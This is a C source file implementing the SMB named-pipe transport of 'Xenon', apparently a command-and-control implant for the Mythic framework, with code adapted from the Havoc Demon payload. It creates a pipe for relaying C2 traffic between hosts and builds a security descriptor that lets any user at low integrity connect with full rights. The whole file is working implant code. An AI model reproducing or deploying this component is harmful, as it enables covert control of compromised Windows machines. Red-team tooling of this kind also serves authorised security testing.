/*
	SMB Named pipe comms
*/

#include "TransportSmb.h"

#include "Xenon.h"
#include "Config.h"

/* This file is the the Mythic SMB profile */
#ifdef SMB_TRANSPORT

/* Ref - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c */

/**
 * @brief Initialize Named Pipe if not setup, then send data to pipe.
 */
BOOL SmbSend(PPackage package)
{
	BOOL Success = FALSE;

	/* Not initialized Yet */
	if ( !xenonConfig->SmbPipe )
	{
		SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
		SECURITY_ATTRIBUTES SecurityAttr = { 0 };

		SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );

		xenonConfig->SmbPipe = CreateNamedPipeA(
				xenonConfig->SmbPipename,		 // Named pipe
				PIPE_ACCESS_DUPLEX,              // read/write access
				PIPE_TYPE_MESSAGE     |          // message type pipe
				PIPE_READMODE_MESSAGE |          // message-read mode
				PIPE_WAIT,                       // blocking mode
				PIPE_UNLIMITED_INSTANCES,        // max. instances
				PIPE_BUFFER_MAX,                 // output buffer size
				PIPE_BUFFER_MAX,                 // input buffer size
				0,                               // client time-out
				&SecurityAttr 					 // security attributes
			);
		
		SmbSecurityAttrFree( &SmbSecAttr );

		if ( !xenonConfig->SmbPipe )
			goto END;

		if ( !ConnectNamedPipe(xenonConfig->SmbPipe, NULL) )
		{
			CloseHandle(xenonConfig->SmbPipe);
			goto END;
		}
		
		/* Send the message to the named pipe */
		if ( !PipeWrite(xenonConfig->SmbPipe, package) )
			goto END;
	}

	/* Send if pipe is already initialized */
	if ( !PipeWrite(xenonConfig->SmbPipe, package) )
	{
		DWORD error = GetLastError();
		_err("Failed to write data to pipe. ERROR : %d", error);
		if ( error == ERROR_NO_DATA )
		{
			if ( xenonConfig->SmbPipe ) {
				CloseHandle(xenonConfig->SmbPipe);
				goto END;
			}
		}
	}

	Success = TRUE;

END:

	return Success;
}


/**
 * @brief Initialize Security Descriptor to allow anyone to connect to namedpipe
 */
VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
{
    SID_IDENTIFIER_AUTHORITY SidIdAuth      = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SidLabel       = SECURITY_MANDATORY_LABEL_AUTHORITY;
    EXPLICIT_ACCESSA         ExplicitAccess = { 0 };
    DWORD                    Result         = 0;
    PACL                     DAcl           = NULL;
    /* zero them out. */
    memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
    memset(SecurityAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

    if ( !AllocateAndInitializeSid(&SidIdAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->Sid) )
    {
        _err( "AllocateAndInitializeSid failed: %u\n", GetLastError() );
        return;
    }
    _dbg( "SmbSecAttr->Sid: %p\n", SmbSecAttr->Sid );

    ExplicitAccess.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ExplicitAccess.grfAccessMode        = SET_ACCESS;
    ExplicitAccess.grfInheritance       = NO_INHERITANCE;
    ExplicitAccess.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ExplicitAccess.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ExplicitAccess.Trustee.ptstrName    = SmbSecAttr->Sid;

    Result = SetEntriesInAclA( 1, &ExplicitAccess, NULL, &DAcl );
    if ( Result != ERROR_SUCCESS )
    {
        _err( "SetEntriesInAclW failed: %u\n", Result );
    }
    _dbg( "DACL: %p\n", DAcl );

    if ( !AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
    {
        _err( "AllocateAndInitializeSid failed: %u\n", GetLastError() );
    }
    _dbg( "sidLow: %p\n", SmbSecAttr->SidLow );

    SmbSecAttr->SAcl = malloc( MAX_PATH );
    if ( !InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
    {
        _err( "InitializeAcl failed: %u\n", GetLastError() );
    }

    if ( !AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
    {
        _err( "AddMandatoryAce failed: %u\n", GetLastError() );
    }

    // now build the descriptor
    SmbSecAttr->SecDec = malloc( SECURITY_DESCRIPTOR_MIN_LENGTH );
    if ( !InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
    {
        _err( "InitializeSecurityDescriptor failed: %u\n", GetLastError() );
    }

    if ( !SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, DAcl, FALSE ) )
    {
        _err( "SetSecurityDescriptorDacl failed: %u\n", GetLastError() );
    }

    if ( !SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
    {
        _err( "SetSecurityDescriptorSacl failed: %u\n", GetLastError() );
    }

    SecurityAttr->lpSecurityDescriptor = SmbSecAttr->SecDec;
    SecurityAttr->bInheritHandle       = FALSE;
    SecurityAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
}

/**
 * @brief Free the allocated memory for Security Descriptor
 */
VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
{
    if ( SmbSecAttr->Sid )
    {
        FreeSid( SmbSecAttr->Sid );
        SmbSecAttr->Sid = NULL;
    }

    if ( SmbSecAttr->SidLow )
    {
        FreeSid( SmbSecAttr->SidLow );
        SmbSecAttr->SidLow = NULL;
    }

    if ( SmbSecAttr->SAcl )
    {
        free( SmbSecAttr->SAcl );
        SmbSecAttr->SAcl = NULL;
    }

    if ( SmbSecAttr->SecDec )
    {
        free( SmbSecAttr->SecDec );
        SmbSecAttr->SecDec = NULL;
    }
}

/**
 * @brief Write the specified buffer to the specified pipe
 * @param Handle handle to the pipe
 * @param package buffer to write
 * @return pipe write successful or not
 */
BOOL PipeWrite(Handle hPipe, PPackage package) 
{
    DWORD Written = 0;
    DWORD Total   = 0;

    do {
        if ( !WriteFile(hPipe, package->buffer + Total, MIN( ( package->length - Total ), PIPE_BUFFER_MAX ), &Written , NULL) ) {
            return FALSE;
        }

        Total += Written;
    } while ( Total < package->length );

    return TRUE;
}




#endif // SMB_TRANSPORT
